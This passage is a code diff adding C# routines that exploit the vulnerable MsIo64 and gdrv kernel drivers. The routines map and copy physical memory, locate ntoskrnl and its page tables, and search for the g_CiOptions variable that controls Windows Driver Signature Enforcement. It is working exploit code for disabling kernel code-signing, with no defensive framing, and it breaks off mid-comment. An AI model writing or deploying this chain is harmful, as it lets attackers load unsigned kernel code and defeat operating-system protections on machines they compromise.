@@ -1,0 +1,340 @@
+        int st = NtUnmapViewOfSection(new IntPtr(-1), view);
+        if (section != IntPtr.Zero) NtClose(section);
+        return st < 0 ? string.Format("0x{0:x8}", st) : "";
+    }
+
+    // ---- W2: MsIo64 0x80102040 map / 0x80102044 unmap -----------------------
+    public static string MsIoOpen(out IntPtr h)
+    {
+        h = CreateFileW(@"\\.\MSIO", GENERIC_READ | GENERIC_WRITE, 0, IntPtr.Zero,
+                        OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, IntPtr.Zero);
+        if (h.ToInt64() == INVALID_HANDLE) return "err=" + Marshal.GetLastWin32Error();
+        return "";
+    }
+
+    // The 0x80102044 handler in MsIo64.sys (temp\drv\msio_1500.txt 0x156b)
+    // requires InputBufferLength==0x28 and hands q[2] to the unmap worker as
+    // the section handle, q[3] as the view base -> the map reply must carry
+    // both in the SAME 5-qword buffer.
+    public static string MsIoTry(IntPtr h, int shape, ulong pa, uint size,
+                                 out uint err, out string outHex)
+    {
+        err = 0; outHex = "";
+        int inLen = shape == 2 ? 0x18 : (shape == 3 ? 0x30 : 0x28);
+        IntPtr inb = Marshal.AllocHGlobal(0x40);
+        IntPtr outb = Marshal.AllocHGlobal(0x40);
+        try
+        {
+            for (int i = 0; i < 0x40; i++) { Marshal.WriteByte(inb, i, 0); Marshal.WriteByte(outb, i, 0); }
+            if (shape == 1) { Marshal.WriteInt64(inb, 0, size); Marshal.WriteInt64(inb, 8, (long)pa); }
+            else { Marshal.WriteInt64(inb, 0, (long)pa); Marshal.WriteInt64(inb, 8, size); }
+            uint got;
+            bool ok = DeviceIoControl(h, 0x80102040, inb, (uint)inLen, outb, 0x40, out got, IntPtr.Zero);
+            err = (uint)Marshal.GetLastWin32Error();
+            byte[] ob = new byte[0x40];
+            Marshal.Copy(outb, ob, 0, 0x40);
+            outHex = Hex(ob);
+            if (!ok) return string.Format("shape{0} FAIL err={1} info={2}", shape, err, got);
+            return string.Format("shape{0} OK info={1}", shape, got);
+        }
+        finally { Marshal.FreeHGlobal(inb); Marshal.FreeHGlobal(outb); }
+    }
+    // ---- W3: gdrv3 map (0xC3502004) and copy-user-to-phys (0xC3502808) ------
+    public static string GdrvMapTry(IntPtr h, ulong pa, ulong size, out ulong va, out uint err)
+    {
+        va = 0; err = 0;
+        IntPtr inb = Marshal.AllocHGlobal(0x20);
+        try
+        {
+            Marshal.WriteInt64(inb, 0, (long)pa);
+            Marshal.WriteInt64(inb, 8, (long)size);
+            Marshal.WriteInt64(inb, 16, 0);
+            Marshal.WriteInt64(inb, 24, 0);
+            uint got;
+            bool ok = DeviceIoControl(h, 0xC3502004, inb, 0x20, inb, 0x20, out got, IntPtr.Zero);
+            err = (uint)Marshal.GetLastWin32Error();
+            if (!ok) return string.Format("FAIL err={0} info={1}", err, got);
+            va = (ulong)Marshal.ReadInt64(inb, 0);
+            return string.Format("OK info={0} q0=0x{1:x} q1=0x{2:x}", got, va, Marshal.ReadInt64(inb, 8));
+        }
+        finally { Marshal.FreeHGlobal(inb); }
+    }
+
+    public static string GdrvCopyTry(IntPtr h, ulong a, ulong b, uint n, out uint err)
+    {
+        err = 0;
+        IntPtr inb = Marshal.AllocHGlobal(0x18);
+        try
+        {
+            Marshal.WriteInt64(inb, 0, (long)b);
+            Marshal.WriteInt64(inb, 8, (long)a);
+            Marshal.WriteInt32(inb, 16, (int)n);
+            uint got;
+            bool ok = DeviceIoControl(h, 0xC3502808, inb, 0x18, inb, 0x18, out got, IntPtr.Zero);
+            err = (uint)Marshal.GetLastWin32Error();
+            return ok ? "OK" : string.Format("FAIL err={0}", err);
+        }
+        finally { Marshal.FreeHGlobal(inb); }
+    }
+
+    public static bool CloseHandle2(IntPtr h) { return CloseHandle(h); }
+
+    public static bool IsUserVa(ulong v)
+    {
+        if (v < 0x10000 || v >= 0x00007FFFFFFFFFFF) return false;
+        if ((v & 0xFFF) != 0) return false;
+        return true;
+    }
+
+    public static string ReadAt(ulong va, int n)
+    {
+        try { byte[] b = new byte[n]; Marshal.Copy(new IntPtr((long)va), b, 0, n); return Hex(b); }
+        catch (Exception) { return null; }
+    }
+
+    public static bool WriteAt(ulong va, byte[] data)
+    {
+        try { Marshal.Copy(data, 0, new IntPtr((long)va), data.Length); return true; }
+        catch (Exception) { return false; }
+    }
+    // ---- X1: RAM top + ntoskrnl physical locate (validated by an export) ---
+    [DllImport("kernel32.dll", SetLastError = true)]
+    static extern bool GetPhysicallyInstalledSystemMemory(out ulong kb);
+
+    public static ulong RamTop()
+    {
+        ulong kb;
+        if (!GetPhysicallyInstalledSystemMemory(out kb)) return 0;
+        return kb * 1024;
+    }
+
+    // A loader-mapped ntoskrnl PE, validated by finding a real export name in
+    // its export table.  hal.dll/win32k are filtered by SizeOfImage.
+    public static string ScanNtoskrnl(IntPtr g, ulong ramTop, ulong limit, out string hits)
+    {
+        hits = "";
+        ulong top = Math.Min(ramTop, limit);
+        byte[] chunk;
+        for (ulong pa = 0x100000; pa < top; pa += 0x10000)
+        {
+            if (!InRam(pa, ramTop)) continue;
+            chunk = GdrvRead(g, pa, 0x10000);
+            for (int o = 0; o < 0x10000; o += 0x1000)
+            {
+                if (chunk[o] != 0x4D || chunk[o + 1] != 0x5A) continue;      // MZ
+                uint e_lfanew = BitConverter.ToUInt32(chunk, o + 0x3C);
+                if (e_lfanew < 0x40 || e_lfanew > 0x200) continue;
+                int pe = o + (int)e_lfanew;
+                if (pe + 0x120 > 0x10000) continue;
+                if (BitConverter.ToUInt32(chunk, pe) != 0x00004550) continue; // PE\0\0
+                if (BitConverter.ToUInt16(chunk, pe + 4) != 0x8664) continue; // amd64
+                int opt = pe + 0x18;
+                if (BitConverter.ToUInt16(chunk, opt) != 0x20B) continue;     // PE32+
+                ushort subsys = BitConverter.ToUInt16(chunk, opt + 0x44);
+                uint sizeImage = BitConverter.ToUInt32(chunk, opt + 0x38);
+                if (subsys != 10) continue;                                   // NATIVE
+                if (sizeImage < 0x400000 || sizeImage > 0x4000000) continue;
+                ulong imgPa = (pa + (ulong)o) & ~0xFFFUL;
+                string verify = ExportHas(g, imgPa, opt, 0x70, "PsLookupProcessByProcessId");
+                string line = string.Format("  native PE pa=0x{0:x} sizeOfImage=0x{1:x} preferred=0x{2:x} export[{3}]",
+                                            imgPa, sizeImage,
+                                            BitConverter.ToUInt64(chunk, opt + 0x18), verify);
+                hits += line + "\r\n";
+                if (verify == "yes") return imgPa.ToString("x");
+            }
+        }
+        return "";
+    }
+
+    // Export directory entry 0 (or 1 for a second dir) walk; returns "yes"/"no".
+    static string ExportHas(IntPtr g, ulong imgPa, int opt, int dirOff, string want)
+    {
+        try
+        {
+            byte[] d = GdrvRead(g, imgPa + (ulong)(opt + dirOff), 8);
+            uint rva = BitConverter.ToUInt32(d, 0), sz = BitConverter.ToUInt32(d, 4);
+            if (rva == 0 || sz < 0x28) return "no-dir";
+            byte[] ed = GdrvRead(g, imgPa + rva, 0x28);
+            uint count = BitConverter.ToUInt32(ed, 0x18);       // NumberOfNames
+            uint names = BitConverter.ToUInt32(ed, 0x20);       // AddressOfNames RVA
+            if (count == 0 || count > 0x2000) return "no-names";
+            byte[] tbl = GdrvRead(g, imgPa + names, (int)count * 4);
+            for (uint i = 0; i < count; i++)
+            {
+                uint nrva = BitConverter.ToUInt32(tbl, (int)i * 4);
+                byte[] nm = GdrvRead(g, imgPa + nrva, want.Length + 1);
+                bool same = true;
+                for (int k = 0; k < want.Length; k++) if (nm[k] != (byte)want[k]) { same = false; break; }
+                if (same) return "yes";
+            }
+            return "no(" + count + ")";
+        }
+        catch (Exception) { return "err"; }
+    }
+    // ---- X2: CR3 discovery via the PML4 self-reference (index 0x1ED) -------
+    // PXE_BASE = 0xFFFFF6FB7DBED000 -> PML4 index 0x1ED, and PML4[0x1ED] must
+    // point at the PML4 itself.  A candidate is only accepted when the double
+    // self-reference holds AND the kernel half of the table is populated.
+    public static string FindPml4(IntPtr g, ulong ramTop, ulong limit, out ulong cr3, out string notes)
+    {
+        cr3 = 0; notes = "";
+        ulong top = Math.Min(ramTop, limit);
+        int seen = 0;
+        for (ulong pa = 0x1000; pa + 0x1000 <= top; pa += 0x1000)
+        {
+            if (!InRam(pa, ramTop)) continue;
+            ulong e = RdQ(g, pa + 0x1EDUL * 8);
+            if ((e & 1) == 0) continue;
+            if ((e & 0x000FFFFFFFFFF000UL) != pa) continue;
+            ulong pdpt = e & 0x000FFFFFFFFFF000UL;
+            ulong e2 = RdQ(g, pdpt + 0x1EDUL * 8);
+            if ((e2 & 1) == 0) continue;
+            if ((e2 & 0x000FFFFFFFFFF000UL) != pa) continue;
+            int present = 0;
+            for (int i = 0x100; i < 0x200; i++) if ((RdQ(g, pa + (ulong)i * 8) & 1) != 0) present++;
+            seen++;
+            if (seen <= 8) notes += string.Format("  self-map candidate cr3=0x{0:x} kernel_entries_present={1}\r\n", pa, present);
+            if (present < 8) continue;
+            if (cr3 == 0) cr3 = pa;
+        }
+        return cr3 == 0 ? "" : seen.ToString();
+    }
+
+    public static bool Walk(IntPtr g, ulong cr3, ulong va, out ulong pa)
+    {
+        pa = 0;
+        ulong e = RdQ(g, cr3 + ((va >> 39) & 0x1FF) * 8);
+        if ((e & 1) == 0) return false;
+        ulong t = e & 0x000FFFFFFFFFF000UL;
+        e = RdQ(g, t + ((va >> 30) & 0x1FF) * 8);
+        if ((e & 1) == 0) return false;
+        if ((e & 0x80) != 0) { pa = (e & 0x000FFFFFC0000000UL) + (va & 0x3FFFFFFFUL); return true; }
+        t = e & 0x000FFFFFFFFFF000UL;
+        e = RdQ(g, t + ((va >> 21) & 0x1FF) * 8);
+        if ((e & 1) == 0) return false;
+        if ((e & 0x80) != 0) { pa = (e & 0x000FFFFFFFE00000UL) + (va & 0x1FFFFFUL); return true; }
+        t = e & 0x000FFFFFFFFFF000UL;
+        e = RdQ(g, t + ((va >> 12) & 0x1FF) * 8);
+        if ((e & 1) == 0) return false;
+        pa = (e & 0x000FFFFFFFFFF000UL) + (va & 0xFFFUL);
+        return true;
+    }
+
+    // The ntoskrnl *virtual* base: the 2 MiB VA in the kernel range whose
+    // translation lands on the physical image we found.  Also cross-checks
+    // SizeOfImage, so a wrong CR3 cannot pass.
+    public static string FindKernelVa(IntPtr g, ulong cr3, ulong ntphys, uint sizeOfImage,
+                                      out ulong vaBase)
+    {
+        vaBase = 0;
+        for (ulong va = 0xFFFFF80000000000UL; va < 0xFFFFF88000000000UL; va += 0x200000)
+        {
+            ulong pa;
+            if (!Walk(g, cr3, va, out pa)) continue;
+            if (pa != ntphys) continue;
+            byte[] hdr = GdrvRead(g, pa, 0x400);
+            if (hdr[0] != 0x4D || hdr[1] != 0x5A) continue;
+            uint e_lfanew = BitConverter.ToUInt32(hdr, 0x3C);
+            if (e_lfanew + 0x100 > 0x400) continue;
+            uint sz = BitConverter.ToUInt32(hdr, (int)e_lfanew + 0x18 + 0x38);
+            if (sz != sizeOfImage) continue;
+            vaBase = va;
+            return "1";
+        }
+        return "";
+    }
+
+    // g_CiOptions is not exported: find the only `mov dword [rip+disp32], IMM`
+    // whose target currently holds IMM (0x0E/0x06 = DSE enabled shapes).
+    public static string FindCiOptions(IntPtr g, ulong cr3, ulong vaBase, ulong physBase,
+                                       uint sizeOfImage, out string report)
+    {
+        report = "";
+        int found = 0;
+        for (uint off = 0; off + 0x1000 <= sizeOfImage; off += 0x1000)
+        {
+            byte[] b = GdrvRead(g, physBase + off, 0x1000);
+            for (int i = 0; i + 10 <= 0x1000; i++)
+            {
+                if (b[i] != 0xC7 || b[i + 1] != 0x05) continue;
+                uint imm = BitConverter.ToUInt32(b, i + 6);
+                if (imm != 0x0E && imm != 0x06 && imm != 0x02 && imm != 0x0D) continue;
+                int disp = BitConverter.ToInt32(b, i + 2);
+                ulong instrVa = vaBase + off + (ulong)i;
+                ulong targetVa = instrVa + 7 + (ulong)(long)disp;
+                ulong tpa;
+                if (!Walk(g, cr3, targetVa, out tpa)) continue;
+                uint cur = RdD(g, tpa);
+                string tag = (cur == imm) ? "  <== SELF-CONSISTENT" : "";
+                report += string.Format("  instrVa=0x{0:x} writes=0x{1:x2} -> targetVa=0x{2:x} targetPa=0x{3:x} current=0x{4:x8}{5}\r\n",
+                                        instrVa, imm, targetVa, tpa, cur, tag);
+                found++;
+                if (found >= 12) return found.ToString();
+            }
+        }
+        return found.ToString();
+    }
+    // MsIo64 0x80102040 with the shape implied by the unmap handler's
+    // ProbeForRead/ProbeForWrite(q1, q0, 4) pair in temp\drv\msio_1500.txt:
+    //   q0 = length of a user in/out block, q1 = pointer to that block
+    //   (phys/size in, view/handle out), q2..q4 driver-owned.
+    // layout 0 = {phys, size}, layout 1 = {size, phys} inside the user block.
+    public static string MsIoMapTry2(IntPtr h, int layout, ulong pa, uint size, ulong q0len,
+                                     out uint err, out string detail)
+    {
+        err = 0; detail = "";
+        IntPtr inb = Marshal.AllocHGlobal(0x40);
+        // 4 KiB user block: the driver writes the view/handle back into q1 and three
+        // powershell.exe c0000374 (STATUS_HEAP_CORRUPTION) crashes on 01/11 17:2x
+        // came from a 0x80-byte HEAP block being written past its end.
+        IntPtr ub = Marshal.AllocHGlobal(0x1000);
+        try
+        {
+            for (int i = 0; i < 0x40; i++) Marshal.WriteByte(inb, i, 0);
+            for (int i = 0; i < 0x1000; i++) Marshal.WriteByte(ub, i, 0);
+            if (layout == 0) { Marshal.WriteInt64(ub, 0, (long)pa); Marshal.WriteInt64(ub, 8, size); }
+            else { Marshal.WriteInt64(ub, 0, size); Marshal.WriteInt64(ub, 8, (long)pa); }
+            Marshal.WriteInt64(inb, 0, (long)q0len);
+            Marshal.WriteInt64(inb, 8, ub.ToInt64());
+            uint got;
+            bool ok = DeviceIoControl(h, 0x80102040, inb, 0x28, inb, 0x28, out got, IntPtr.Zero);
+            err = (uint)Marshal.GetLastWin32Error();
+            byte[] ib = new byte[0x28]; Marshal.Copy(inb, ib, 0, 0x28);
+            byte[] ubb = new byte[0x1000]; Marshal.Copy(ub, ubb, 0, 0x1000);
+            detail = "ctl=" + Hex(ib) + " user=" + Hex(ubb);
+            return (ok ? "OK" : "FAIL err=" + err) + " layout" + layout + " q0=0x" + q0len.ToString("x");
+        }
+        finally { Marshal.FreeHGlobal(inb); Marshal.FreeHGlobal(ub); }
+    }
+
+    public static string MsIoUnmapTry(IntPtr h, ulong q0, ulong q1, ulong q2, ulong q3, ulong q4,
+                                      out uint err)
+    {
+        err = 0;
+        IntPtr inb = Marshal.AllocHGlobal(0x28);
+        try
+        {
+            for (int i = 0; i < 0x28; i++) Marshal.WriteByte(inb, i, 0);
+            Marshal.WriteInt64(inb, 0x00, (long)q0);
+            Marshal.WriteInt64(inb, 0x08, (long)q1);
+            Marshal.WriteInt64(inb, 0x10, (long)q2);
+            Marshal.WriteInt64(inb, 0x18, (long)q3);
+            Marshal.WriteInt64(inb, 0x20, (long)q4);
+            uint got;
+            bool ok = DeviceIoControl(h, 0x80102044, inb, 0x28, inb, 0x28, out got, IntPtr.Zero);
+            err = (uint)Marshal.GetLastWin32Error();
+            return ok ? ("OK info=" + got) : ("FAIL err=" + err);
+        }
+        finally { Marshal.FreeHGlobal(inb); }
+    }
+
+    // MsIo64 0x80102040 -- TRUE input shape, from the full worker-0x1090 RE
+    // (temp\drv\annot_MsIo64.txt):  in = { q0 = view length (driver caps it at 4!),
+    // q1 = user VA whose LOW 32 BITS are the PHYSICAL ADDRESS to map, q2/q3/q4 = 0
+    // in -> out: section handle / view base VA in OUR process / section object }.
+    // The driver ZwOpenSection's \Device\PhysicalMemory with kernel PreviousMode
+    // (the usermode DACL that kills W1 does not apply), then ZwMapViewOfSection(
+    // handle, -1 /*current process*/, ..., SectionOffset=low32(q1),
+    // ViewSize=min(q0,4), PAGE_READWRITE|NOCACHE).  Worker 0x10aa..0x10d0 also
+    // range-checks low32(q1) in [G, G+0x10000000) of a driver global (image offset
+    // 0x3150) -- outside it the call dies with STATUS_ACCESS_DENIED (win32 err 5),
